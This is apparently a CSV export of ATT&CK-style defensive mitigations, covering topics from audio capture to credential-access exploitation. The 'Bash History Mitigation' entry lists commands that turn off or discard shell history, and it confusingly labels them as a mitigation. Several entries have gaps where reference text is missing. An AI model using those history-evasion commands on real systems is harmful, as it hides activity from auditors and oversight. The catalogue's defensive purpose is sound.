Identify and block potentially malicious software that may be used to record audio by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Audit,"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.",course_of_action
Authentication Package Mitigation,"Windows 8.1, Windows Server 2012 R2, and later versions, may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code>, which requires all DLLs loaded by LSA to be signed by Microsoft. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)",course_of_action
Automated Collection Mitigation,"Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through  and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through  techniques.

Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Automated Exfiltration Mitigation,"Identify unnecessary system utilities, scripts, or potentially malicious software that may be used to transfer data outside of a network, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
BITS Jobs Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of operating system design features. For example, disabling all BITS functionality will likely have unintended side effects, such as preventing legitimate software patching and updating. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. (Citation: Mondok Windows PiggyBack BITS May 2007)

Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic.

Consider limiting access to the BITS interface to specific users or groups. (Citation: Symantec BITS May 2007)

Consider reducing the default BITS job lifetime in Group Policy or by editing the <code>JobInactivityTimeout</code> and <code>MaxDownloadTime</code> Registry values in <code> HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS</code>. (Citation: Microsoft BITS)",course_of_action
Bash History Mitigation,"There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:
<code>set +o history</code> and <code>set -o history</code> to start logging again;
<code>unset HISTFILE</code> being added to a user's .bash_rc file; and
<code>ln -s /dev/null ~/.bash_history</code> to write commands to <code>/dev/null</code>instead.",course_of_action
Behavior Prevention on Endpoint,"Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.",course_of_action
Binary Padding Mitigation,"Identify potentially malicious software that may be executed from a padded or otherwise obfuscated binary, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Boot Integrity,Use secure methods to boot a system and verify the integrity of the operating system and loading mechanisms.,course_of_action
Bootkit Mitigation,Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform this action. Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process),course_of_action
Browser Bookmark Discovery Mitigation,"File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. For example, mitigating accesses to browser bookmark files will likely have unintended side effects such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Browser Extensions Mitigation,"Only install browser extensions from trusted sources that can be verified. Ensure extensions that are installed are the intended ones as many malicious extensions will masquerade as legitimate ones.

Browser extensions for some browsers can be controlled through Group Policy. Set a browser extension white or black list as appropriate for your security policy. (Citation: Technospot Chrome Extensions GP)

Change settings to prevent the browser from installing extensions without sufficient permissions.

Close out all browser sessions when finished using them.",course_of_action
Brute Force Mitigation,"Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. 
Too strict a policy can create a denial of service condition and render environments un-usable, with all accounts being locked-out permanently. Use multifactor authentication. Follow best practices for mitigating access to 

Refer to NIST guidelines when creating passwords.(Citation: NIST 800-63-3)

Where possible, also enable multi factor authentication on external facing services.",course_of_action
Bypass User Account Control Mitigation,"Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as . 

Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate. (Citation: Github UACMe)",course_of_action
CMSTP Mitigation,CMSTP.exe may not be necessary within a given environment (unless using it for VPN connection installation). Consider using application whitelisting configured to block execution of CMSTP.exe if it is not required for a given system or network to prevent potential misuse by adversaries. (Citation: MSitPros CMSTP Aug 2017),course_of_action
Change Default File Association Mitigation,"Direct mitigation of this technique is not recommended since it is a legitimate function that can be performed by users for software preferences. Follow Microsoft's best practices for file associations. (Citation: MSDN File Associations)

Identify and block potentially malicious software that may be executed by this technique using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Clear Command History Mitigation,"Preventing users from deleting or writing to certain files can stop adversaries from maliciously altering their <code>~/.bash_history</code> files. Additionally, making these environment variables readonly can make sure that the history is preserved   (Citation: Securing bash history).",course_of_action
Clipboard Data Mitigation,"Instead of blocking software based on clipboard capture behavior, identify potentially malicious software that may contain this functionality, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Code Signing,Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.,course_of_action
Code Signing Mitigation,Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system. (Citation: NSA MS AppLocker) (Citation: TechNet Trusted Publishers) (Citation: Securelist Digital Certificates),course_of_action
Commonly Used Port Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Communication Through Removable Media Mitigation,Disable Autorun if it is unnecessary. (Citation: Microsoft Disable Autorun) Disallow or restrict removable media at an organizational policy level if they are not required for business operations. (Citation: TechNet Removable Media Control),course_of_action
Compile After Delivery Mitigation,"This type of technique cannot be easily mitigated with preventive controls or patched since it is based on the abuse of operating system design features. For example, blocking all file compilation may have unintended side effects, such as preventing legitimate OS frameworks and code development mechanisms from operating properly. Consider removing compilers if not needed, otherwise efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior.

Identify unnecessary system utilities or potentially malicious software that may be used to decrypt, deobfuscate, decode, and compile files or information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Compiled HTML File Mitigation,"Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns, such as CHM files. (Citation: PaloAlto Preventing Opportunistic Attacks Apr 2016) Also consider using application whitelisting to prevent execution of hh.exe if it is not required for a given system or network to prevent potential misuse by adversaries.",course_of_action
Component Firmware Mitigation,"Prevent adversary access to privileged accounts or access necessary to perform this technique.

Consider removing and replacing system components suspected of being compromised.",course_of_action
Component Object Model Hijacking Mitigation,"Direct mitigation of this technique may not be recommended for a particular environment since COM objects are a legitimate part of the operating system and installed software. Blocking COM object changes may have unforeseen side effects to legitimate functionality.

Instead, identify and block potentially malicious software that may execute, or be executed by, this technique using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Control Panel Items Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of operating system design features. For example, mitigating specific Windows API calls and/or execution of particular file extensions will likely have unintended side effects, such as preventing legitimate software (i.e., drivers and configuration tools) from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior.

Restrict storage and execution of Control Panel items to protected directories, such as <code>C:\Windows</code>, rather than user directories.

Index known safe Control Panel items and block potentially malicious software using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown executable files.

Consider fully enabling User Account Control (UAC) to impede system-wide changes from illegitimate administrators. (Citation: Microsoft UAC)",course_of_action
Create Account Mitigation,"Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to  that may be used to create privileged accounts within an environment.

Adversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.

Protect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.",course_of_action
Credential Access Protection,Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.,course_of_action
Credential Dumping Mitigation,"### Windows
Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using  if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access)

On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. (Citation: Microsoft LSA)

Identify and block potentially malicious software that may be used to dump credentials by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)

With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. (Citation: TechNet Credential Guard) It also does not protect against all forms of credential dumping. (Citation: GitHub SHB Credential Guard)

Manage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Microsoft Replication ACL)

Consider disabling or restricting NTLM traffic. (Citation: Microsoft Disable NTLM Nov 2012)

### Linux
Scraping the passwords from memory requires root privileges. Follow best practices in restricting access to escalated privileges to avoid hostile programs from accessing such sensitive regions of memory.",course_of_action
Credentials in Files Mitigation,Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences. (Citation: Microsoft MS14-025),course_of_action
Credentials in Registry Mitigation,"Do not store credentials within the Registry. Proactively search for credentials within Registry keys and attempt to remediate the risk. If necessary software must store credentials, then ensure those accounts have limited permissions so they cannot be abused if obtained by an adversary.",course_of_action
Custom Command and Control Protocol Mitigation,"Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Custom Cryptographic Protocol Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
DCShadow Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of AD design features. For example, mitigating specific AD API calls will likely have unintended side effects, such as preventing DC replication from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior.",course_of_action
DLL Search Order Hijacking Mitigation,"Disallow loading of remote DLLs. (Citation: Microsoft DLL Preloading) This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+. (Citation: Microsoft DLL Search) Path Algorithm

Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory). The Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode</code> (Citation: Microsoft DLL Search)

Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses. (Citation: Powersploit)

Identify and block potentially malicious software that may be executed through search order hijacking by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown DLLs.",course_of_action
DLL Side-Loading Mitigation,Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.,course_of_action
Data Backup,Take and store data backups from end user systems and critical servers. Ensure backup and storage systems are hardened and kept separate from the corporate network to prevent compromise.,course_of_action
Data Compressed Mitigation,"Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)

If network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.",course_of_action
Data Destruction Mitigation,"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.(Citation: Ready.gov IT DRP) Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.

Identify potentially malicious software and audit and/or block it by using whitelisting(Citation: Beechey 2010) tools, like AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA MS AppLocker) or Software Restriction Policies(Citation: Corio 2008) where appropriate.(Citation: TechNet Applocker vs SRP)",course_of_action
Data Encoding Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Data Encrypted Mitigation,"Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Data Encrypted for Impact Mitigation,"Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data.(Citation: Ready.gov IT DRP)

In some cases, the means to decrypt files affected by a ransomware campaign is released to the public. Research trusted sources for public releases of decryptor tools/keys to reverse the effects of ransomware.

Identify potentially malicious software and audit and/or block it by using whitelisting(Citation: Beechey 2010) tools, like AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA MS AppLocker) or Software Restriction Policies(Citation: Corio 2008) where appropriate.(Citation: TechNet Applocker vs SRP)",course_of_action
Data Obfuscation Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Data Staged Mitigation,"Identify system utilities, remote access or third-party tools, users or potentially malicious software that may be used to store compressed or encrypted data in a publicly writeable directory, central location, or commonly used staging directories (e.g. recycle bin) that is indicative of non-standard behavior, and audit and/or block them by using file integrity monitoring tools where appropriate. Consider applying data size limits or blocking file writes of common compression and encryption utilities such as 7zip, RAR, ZIP, or zlib on frequently used staging directories or central locations and monitor attempted violations of those restrictions.",course_of_action
Data Transfer Size Limits Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Data from Information Repositories Mitigation,"To mitigate adversary access to information repositories for collection:

* Develop and publish policies that define acceptable information to be stored
* Appropriate implementation of access control mechanisms that include both authentication and appropriate authorization
* Enforce the principle of least-privilege
* Periodic privilege review of accounts
* Mitigate access to  that may be used to access repositories",course_of_action
Data from Local System Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Data from Network Shared Drive Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to collect data from a network share, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Data from Removable Media Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Defacement Mitigation,Implementing best practices for websites such as defending against  (Citation: OWASP Top 10 2017). Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. (Ready.gov IT DRP) Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.,course_of_action
Deobfuscate/Decode Files or Information Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to deobfuscate or decode files or information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Disable or Remove Feature or Program,Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.,course_of_action
Disabling Security Tools Mitigation,"Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.",course_of_action
Distributed Component Object Model Mitigation,"Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{AppID_GUID}</code> associated with the process-wide security of individual COM applications. (Citation: Microsoft Process Wide Com Keys)

Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole</code> associated with system-wide security defaults for all COM applications that do no set their own process-wide security. (Citation: Microsoft System Wide Com Keys) (Citation: Microsoft COM ACL)

Consider disabling DCOM through Dcomcnfg.exe. (Citation: Microsoft Disable DCOM)

Enable Windows firewall, which prevents DCOM instantiation by default.

Ensure all COM alerts and Protected View are enabled. (Citation: Microsoft Protected View)",course_of_action
Do Not Mitigate,This category is to associate techniques that mitigation might increase risk of compromise and therefore mitigation is not recommended.,course_of_action
Domain Fronting Mitigation,"If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be Domain Fronting.

In order to use domain fronting, attackers will likely need to deploy additional tools to compromised systems. (Citation: FireEye APT29 Domain Fronting With TOR March 2017) (Citation: Mandiant No Easy Breach) It may be possible to detect or prevent the installation of these tools with Host-based solutions.",course_of_action
Domain Generation Algorithms Mitigation,"This technique may be difficult to mitigate since the domains can be registered just before they are used, and disposed shortly after. Malware researchers can reverse-engineer malware variants that use DGAs and determine future domains that the malware will attempt to contact, but this is a time and resource intensive effort.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA Brute Force) Malware is also increasingly incorporating seed values that can be unique for each instance, which would then need to be determined to extract future generated domains. In some cases, the seed that a particular sample uses can be extracted from DNS traffic.(Citation: Akamai DGA Mitigation) Even so, there can be thousands of possible domains generated per day; this makes it impractical for defenders to preemptively register all possible C2 domains due to the cost. In some cases a local DNS sinkhole may be used to help prevent DGA-based command and control at a reduced cost.

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Domain Trust Discovery Mitigation,Map the trusts within existing domains/forests and keep trust relationships to a minimum. Employ network segmentation for sensitive domains.(Citation: Harmj0y Domain Trusts),course_of_action
Drive-by Compromise Mitigation,"Drive-by compromise relies on there being a vulnerable piece of software on the client end systems. Use modern browsers with security features turned on. Ensure all browsers and plugins kept updated can help prevent the exploit phase of this technique.

For malicious code served up through ads, adblockers can help prevent that code from executing in the first place. Script blocking extensions can help prevent the execution of JavaScript that may commonly be used during the exploitation process.

Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist. (Citation: Windows Blogs Microsoft Edge Sandbox) (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Other types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility.",course_of_action
Dylib Hijacking Mitigation,"Prevent users from being able to write files to the search paths for applications, both in the folders where applications are run from and the standard dylib folders. If users can't write to these directories, then they can't intercept the search path.",course_of_action
Dynamic Data Exchange Mitigation,"Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution. (Citation: Microsoft DDE Advisory Nov 2017) (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: GitHub Disable DDEAUTO Oct 2017) Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel. (Citation: Microsoft ADV170021 Dec 2017)

Ensure Protected View is enabled (Citation: Microsoft Protected View) and consider disabling embedded files in Office programs, such as OneNote, not enrolled in Protected View. (Citation: Enigma Reviving DDE Jan 2018) (Citation: GitHub Disable DDEAUTO Oct 2017)

On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs. (Citation: Microsoft ASR Nov 2017) (Citation: Enigma Reviving DDE Jan 2018)",course_of_action
Email Collection Mitigation,"Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.

Use of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.

Identify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Encrypt Sensitive Information,Protect sensitive information with strong encryption.,course_of_action
Endpoint Denial of Service Mitigation,"Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies.",course_of_action
Environment Variable Permissions,Prevent modification of environment variables by unauthorized users and groups.,course_of_action
Environmental Keying Mitigation,"This technique likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised.",course_of_action
Execution Prevention,"Block execution of code on a system through application control, and/or script blocking.",course_of_action
Execution through Module Load Mitigation,"Directly mitigating module loads and API calls related to module loads will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying and correlated subsequent behavior to determine if it is the result of malicious activity.",course_of_action
Exfiltration Over Command and Control Channel Mitigation,"Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Exfiltration Over Other Network Medium Mitigation,Ensure host-based sensors maintain visibility into usage of all network adapters and prevent the creation of new ones where possible. (Citation: Microsoft GPO Bluetooth FEB 2009) (Citation: TechRepublic Wireless GPO FEB 2009),course_of_action
Exfiltration Over Physical Medium Mitigation,Disable Autorun if it is unnecessary. (Citation: Microsoft Disable Autorun) Disallow or restrict removable media at an organizational policy level if they are not required for business operations. (Citation: TechNet Removable Media Control),course_of_action
Exploit Protection,Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.,course_of_action
Exploit Public-Facing Application Mitigation,"Application isolation and least privilege help lesson the impact of an exploit. Application isolation will limit what other processes and system features the exploited target can access, and least privilege for service accounts will limit what permissions the exploited process gets on the rest of the system. Web Application Firewalls may be used to limit exposure of applications.

Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure.

Use secure coding best practices when designing custom software that is meant for deployment to externally facing systems. Avoid issues documented by OWASP, CWE, and other software weakness identification efforts.

Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure.",course_of_action
Exploitation for Client Execution Mitigation,"Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist. (Citation: Windows Blogs Microsoft Edge Sandbox) (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Other types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility.",course_of_action
Exploitation for Credential Access Mitigation,"Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, if available. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion.",course_of_action
